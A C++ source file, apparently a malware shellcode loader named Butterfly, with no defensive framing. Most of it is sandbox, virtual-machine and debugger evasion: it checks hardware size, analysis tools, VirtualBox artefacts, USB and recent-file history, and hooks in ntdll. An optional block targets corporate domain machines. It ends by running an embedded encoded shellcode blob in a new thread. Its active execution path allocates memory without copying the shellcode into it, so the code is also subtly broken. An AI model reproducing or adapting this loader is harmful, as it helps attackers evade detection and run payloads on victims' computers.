// Butterfly.cpp : $Author = toaster x x
//									  ^
//
#include <Windows.h>
#include <chrono>
#include <thread>
#include <devguid.h>
#include <winternl.h>
#include <SetupAPI.h>
#include<IPTypes.h>
#include<ShlObj.h>
#include<strsafe.h>
#include<Psapi.h>
#include<TlHelp32.h>
#include <iostream>
//include "Helper.h"

EXTERN_C NTSTATUS(NTAPI NtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PTHREAD_START_ROUTINE lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID AttributeList
	);


bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
{
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution < 0) xResolution = -xResolution;
	if (yResolution < 0) yResolution = -yResolution;
	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
	{
		*((BOOL*)data) = true;
	}
	return true;
}

DWORD GetParentPID(DWORD pid)
{
	DWORD ppid = 0;
	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			if (processEntry.th32ProcessID == pid)
			{
				ppid = processEntry.th32ParentProcessID;
				break;
			}
		} while (Process32NextW(hSnapshot, &processEntry));
	}
	CloseHandle(hSnapshot);
	return ppid;
}
int C = 0;


BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
{
	WCHAR windowTitle[1024];
	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
	CharUpperW(windowTitle);
	if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
	return true;
}

//DO THE XOR ENCODING

void main()
{
	
	//check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 50) return;
	
	//RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return;
	//CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2)
		return;



	//Check for Parent process; Incase it's started By a Debugger
	DWORD parentPid = GetParentPID(GetCurrentProcessId());
	WCHAR parentName[MAX_PATH + 1];
	DWORD dwParentName = MAX_PATH;
	HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
	QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot'
	CharUpperW(parentName);
	if (wcsstr(parentName, L"WINDBG.EXE")) return;
	if (wcsstr(parentName, L"SAMPLE.EXE")) return;





	PROCESSENTRY32W processEntry = { 0 };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	WCHAR processName[MAX_PATH + 1];
	if (Process32FirstW(hSnapshot, &processEntry))
	{
		do
		{
			StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
			CharUpperW(processName);
			if (wcsstr(processName, L"WIRESHARK.EXE")) exit(0);
			if (wcsstr(processName, L"PROCMON.EXE")) exit(0);
			if (wcsstr(processName, L"IDA.EXE")) exit(0);
			if (wcsstr(processName, L"X64DBG.EXE")) exit(0);
		} while (Process32NextW(hSnapshot, &processEntry));
	}


	//Check files for a VM specific DLL file
	WIN32_FIND_DATAW findFileData;
	if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return ;

	// check registry key for a VM specific VBOX registry key
	HKEY hkResult;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return;


	
	//UNCOMMENT & FIX INCASE OF CORPORATE TARGET
	//-------------------------------------------

	//Don't forget to include me :
	//#include<LM.h>

	/*
	
	PWSTR domainName;
	NETSETUP_JOIN_STATUS status;
	NetGetJoinInformation(NULL, &domainName, &status);
	if (status != NetSetupDomainName) return;



	DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
	wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
	GetComputerNameW(computerName, &computerNameLength);
	CharUpperW(computerName);
	if (wcsstr(computerName, L"DESKTOP-")) return;

		
	*/


	//-----------------------------------------------------------


	//check if the Malware's name maybe changed for as an e
	wchar_t currentProcessPath[MAX_PATH + 1];
	GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
	CharUpperW(currentProcessPath);
	if (!wcsstr(currentProcessPath, L"BUTTERFLY.EXE")) return;




	/*
	
	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
	int xResolution = GetSystemMetrics(SM_CXSCREEN);
	int yResolution = GetSystemMetrics(SM_CYSCREEN);
	if (xResolution < 1000 && yResolution < 1000)  return;
	
	*/

	//Number of USBs mounted
	HKEY hKey;
	DWORD mountedUSBDevicesCount;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (mountedUSBDevicesCount < 1) return;



	/*
	MessageBoxW(NULL, L"Just click OK", L"Hello", 0);


	//Unhooking function

	PVOID pMessageBoxW = GetProcAddress(GetModuleHandleW(L"user32.dll"), "MessageBoxW");
DWORD oldProtect;
VirtualProtect(pMessageBoxW, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
char hook[] = { 0xC3 }; // ret
memcpy(pMessageBoxW, hook, 1);
VirtualProtect(pMessageBoxW, 1, oldProtect, &oldProtect);

MessageBoxW(NULL, L"Hooked", L"Hooked", 0); // won't show up

// detect and fix the hook
PVOID pMessageBoxWOriginal = LoadDllFromDiskAndFindFunctionCode(); // see the previous code snippet
PVOID pMessageBoxWHooked = GetProcAddress(GetModuleHandleW(L"user32.dll"), "MessageBoxW");
if (memcmp(pMessageBoxWHooked, pMessageBoxWOriginal, 16))
{
	DWORD oldProtection, tempProtection;
	VirtualProtect(pMessageBoxW, 16, PAGE_EXECUTE_READWRITE, &oldProtection);
	memcpy(pMessageBoxWHooked, pMessageBoxWOriginal, 16);
	VirtualProtect(pMessageBoxW, 16, oldProtection, &tempProtection);
}
MessageBoxW(NULL, L"Fixed", L"Fixed", 0);

	*/




	//browse the %APPDATA%\Microsoft\Windows\Recent folder and count items inside; VMs has low Entry numbers
	PWSTR recentFolder = NULL;
	SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
	wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
	StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
	StringCbCatW(recentFolderFiles, MAX_PATH, L"\\*");
	int numberOfRecentFiles = 0;
	WIN32_FIND_DATAW findFileData2;
	HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData2);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			numberOfRecentFiles++;
		} while (FindNextFileW(hFind, &findFileData2));
	}
	if (numberOfRecentFiles >= 2) numberOfRecentFiles -= 2; //exclude '.' and '..'
	if (numberOfRecentFiles < 20) return ;

	//check if getting debugged
	bool debugged = false;
	EnumWindows(EnumWindowsProc, (LPARAM)(&debugged));
	if (debugged) return;

	//Number of processes
	DWORD runningProcessesIDs[1024];
	DWORD runningProcessesCountBytes;
	DWORD runningProcessesCount;
	EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
	runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
	if (runningProcessesCount < 50) {
		return;
	}
	

	//UNHOOKING OF NTCreateThread 


	// manually load the dll
	HANDLE dllFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dllFileSize = GetFileSize(dllFile, NULL);
	HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(dllFile);

	// analyze the dll
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

	// find the original function code
	PVOID pNtCreateThreadExOriginal = NULL;
	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
		if (!strcmp(pFunctionName, "NtCreateThreadEx"))
		{
			pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
			break;
		}
	}

	// compare functions
	PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
	if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return;





	wprintf_s(L"Now hacking...\n");

	const char shellcode[] ="\xbd\x79\xbd\x0b\xdc\xdb\xd2\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x7f\x31\x6f\x13\x03\x6f\x13\x83\xef\x85\x5f\xfe\x20"
"\x3d\x23\xe5\x29\x55\xe3\xe6\xc9\xa5\xa5\xb7\x88\xf5\x77"
"\x69\x5d\xbd\x46\x5b\x04\x75\x22\x09\xa7\xcd\xbf\xfc\x3f"
"\x85\x34\x52\x60\x5d\xc0\x21\x30\x15\xd9\x72\xfa\xef\xa8"
"\x4d\x32\xa7\x03\x6e\x68\x0b\x05\x12\x73\x5f\xe5\xab\xb2"
"\x56\xe8\x6a\x34\xa9\x11\x81\x64\x68\x87\x12\x02\x38\x07"
"\x28\x56\x80\x0f\x2f\x87\x73\x0f\xa7\x27\x83\x10\xf0\xa2"
"\x43\x64\x67\xe5\x42\x55\x37\x7e\x0c\x4d\xfc\x0b\xcc\x4d"
"\xb5\x0a\x1c\x6e\x13\x45\x63\xb8\xdd\xde\xaf\xb3\x96\xe1"
"\x19\x8e\x17\x2b\xed\x20\x98\x07\xac\x83\xd1\x55\x6f\x05"
"\x23\x5d\x8f\x70\x52\xd2\x4c\x37\xb0\xe3\x17\xfe\x69\x86"
"\x4f\x58\xce\xe2\x2f\x7d\x87\xf5\x7f\x1b\x56\x7d\x73\xac"
"\x1c\x0a\xcb\x30\xd4\x0d\x1b\x09\x6d\x09\x13\xc2\x70\xc2"
"\x62\x8b\x33\xba\x3a\x72\xee\x7b\x9a\xc5\x57\x3d\x40\x8e"
"\xe4\x51\x54\x4f\xb9\x56\x74\x17\x7c\xf0\x2e\xe0\xf5\x10"
"\x27\xa7\xf6\xea\x48\x15\x40\xab\xc1\xd5\x60\x8c\x1e\x28"
"\x85\x32\x21\x1a\xcc\xbb\x47\xea\x4f\x57\x27\xea\x4f\xa8"
"\x6e\x64\xaa\xe1\xcc\x74\x35\xe3\x70\x79\x35\x03\x88\x38"
"\x61\x4a\x01\x5e\xc5\xc5\xe0\xde\x6c\x99\x75\xc7\x97\xdd"
"\xac\x4b\x11\xcb\x26\x55\x20\x0c\xb6\x0c\x63\xb6\x9f\x2e"
"\x08\xc6\x20\xfb\x9f\x96\x93\x35\xe9\x5a\x1a\xf6\xa1\x9b"
"\x9c\xbe\xb8\xa6\x54\xc0\x7b\x6e\xed\xff\x3d\xd5\x07\xf0"
"\x62\xc9\x28\xda\xd5\x83\x11\x8f\xf5\xd2\xc5\x1c\x7f\x36"
"\xbd\x15\x86\xf6\x87\xe4\xa2\xce\x90\x17\x81\x79\x6f\x3a"
"\x62\xf3\x76\xfb\xc9\xb4\x61\xc4\xd2\x44\xa4\x78\x1c\x7b"
"\x0e\xb2\x8c\x33\x07\x4d\x71\x7e\x63\x42\x49\x9f\x74\x4f"
"\xe6\xd6\x73\x38\x7e\x2f\xc2\x03\xf5\xde\x89\x12\x09\xcb"
"\x59\x54\x31\x54\x5b\x56\xba\xdc\xe3\x35\xd7\xba\x13\xba"
"\x27\x43\x13\xfb\x77\x02\x43\xb3\xfe\x66\x34\x14\x56\x2a"
"\x8b\x5a\x32\xb9\xb2\x1b\x93\x23\xb8\xfa\xd4\xe0\x64\x57"
"\xda\xe9\x2c\xda\x98\xcd\xb4\x22\x20\x66\x8c\x23\xc7\x20"
"\x5c\x75\x58\x8c\x0c\x34\x08\x47\x53\x76\xe9\x07\xe2\x88"
"\x22\xea\x7d\xb7\xff\x7c\xbc\x79\xba\x06\xf2\x45\x3c\x07"
"\xdf\xf2\x71\x2a\x97\xfd\xb8\x41\x29\x43\x87\x5e\xb2\x5e"
"\x97\xa1\x69\xdb\xa7\xeb\x33\x4a\x09\xae\x95\xe6\x34\x53"
"\x26\xdd\x0f\xef\x1c\xf6\xb3\xe9\xe0\x0d\x4c\x0e\xf8\x67"
"\x49\x4a\xbf\x94\x23\xc3\x55\x9b\x9a\x5a\x20\x41\xe3\x88";
	/*
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	*/


	//replace with above code in case of no shell generation
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	HANDLE hThread;
	HANDLE hProcess = GetCurrentProcess();
	NtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, FALSE, NULL, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
}
